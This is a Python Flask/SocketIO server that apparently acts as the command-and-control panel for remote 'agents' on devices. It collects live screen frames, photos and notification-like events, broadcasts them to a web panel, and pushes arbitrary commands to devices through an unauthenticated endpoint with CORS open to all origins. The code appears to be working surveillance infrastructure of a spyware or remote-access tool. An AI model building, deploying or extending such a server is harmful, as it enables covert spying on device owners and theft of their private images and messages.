import eventlet
eventlet.monkey_patch()

import os
import time
import uuid
import threading
from collections import deque
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "cinder-brain")

socketio = SocketIO(app, cors_allowed_origins="*",
                    async_mode="eventlet", logger=False, engineio_logger=False)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PANEL_DIR = os.path.join(BASE_DIR, "panel")

AGENTS = {}
FRAMES = {}
PHOTOS = {}
STAT = {"frames": 0, "drop": 0}
LOCK = threading.Lock()
KEEP = 40

def now():
    return time.time()

def did_of(sid):
    a = AGENTS.get(sid)
    return a["id"] if a else None

def qpush(store, key, obj):
    with LOCK:
        if key not in store:
            store[key] = deque(maxlen=KEEP)
        store[key].append(obj)

@app.route("/healthz")
def healthz():
    return jsonify({"ok": True, "agents": len(AGENTS),
                    "frames": STAT["frames"], "drop": STAT["drop"],
                    "photos": {k: len(v) for k, v in PHOTOS.items()}})

@app.route("/")
def root():
    p = os.path.join(PANEL_DIR, "index.html")
    if os.path.exists(p):
        return send_from_directory(PANEL_DIR, "index.html")
    return jsonify({"ok": True, "ui": "/ui", "health": "/healthz"})

@app.route("/ui")
def ui():
    return send_from_directory(PANEL_DIR, "index.html")

@app.route("/panel/<path:fn>")
def panel_file(fn):
    return send_from_directory(PANEL_DIR, fn)

@app.route("/api/devices")
def api_devices():
    out, seen = [], set()
    for a in AGENTS.values():
        if a["id"] in seen:
            continue
        seen.add(a["id"])
        out.append({"id": a["id"], "name": a.get("name", ""),
                    "online": (now() - a["last_seen"]) < 20})
    return jsonify(out)

@app.route("/api/cmd", methods=["POST"])
def api_cmd():
    d = request.get_json(force=True, silent=True) or {}
    did, act = d.get("device_id"), d.get("act")
    if not did or not act:
        return jsonify({"ok": False, "err": "need device_id & act"}), 400
    sid = None
    for s, a in AGENTS.items():
        if a["id"] == did:
            sid = s
            break
    if not sid:
        return jsonify({"ok": False, "err": "offline"}), 404
    socketio.emit("cmd", {k: v for k, v in d.items() if k != "device_id"}, to=sid)
    return jsonify({"ok": True})

@socketio.on("agent_hello")
def on_hello(data):
    data = data or {}
    did = str(data.get("id") or uuid.uuid4().hex[:12])
    AGENTS[request.sid] = {"id": did, "name": str(data.get("name") or ""), "last_seen": now()}
    socketio.emit("device_online", {"id": did}, broadcast=True)
    return {"ok": True, "id": did}

@socketio.on("disconnect")
def on_disconnect():
    a = AGENTS.pop(request.sid, None)
    if a:
        socketio.emit("device_offline", {"id": a["id"]}, broadcast=True)

@socketio.on("frame")
def on_frame(data):
    data = data or {}
    did = did_of(request.sid)
    if not did:
        return
    a = AGENTS.get(request.sid)
    if a:
        a["last_seen"] = now()
    b64 = data.get("b64") or data.get("frame") or ""
    if not b64:
        return
    FRAMES[did] = b64
    with LOCK:
        STAT["frames"] += 1
    socketio.emit("frame", {"id": did, "b64": b64}, broadcast=True)

@socketio.on("device_event")
def on_event(data):
    data = data or {}
    did = did_of(request.sid)
    if not did:
        return
    qpush(PHOTOS, did, {"type": data.get("type", ""), "title": data.get("title", ""),
                        "text": data.get("text", ""), "pkg": data.get("pkg", ""),
                        "ts": now()})
    socketio.emit("event", {"id": did, **data}, broadcast=True)

@socketio.on("photo_data")
def on_photo(data):
    data = data or {}
    did = did_of(request.sid)
    if not did:
        return
    qpush(PHOTOS, did, {"type": "photo", "b64": data.get("b64", ""), "ts": now()})
    socketio.emit("photo", {"id": did, "b64": data.get("b64", "")}, broadcast=True)

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
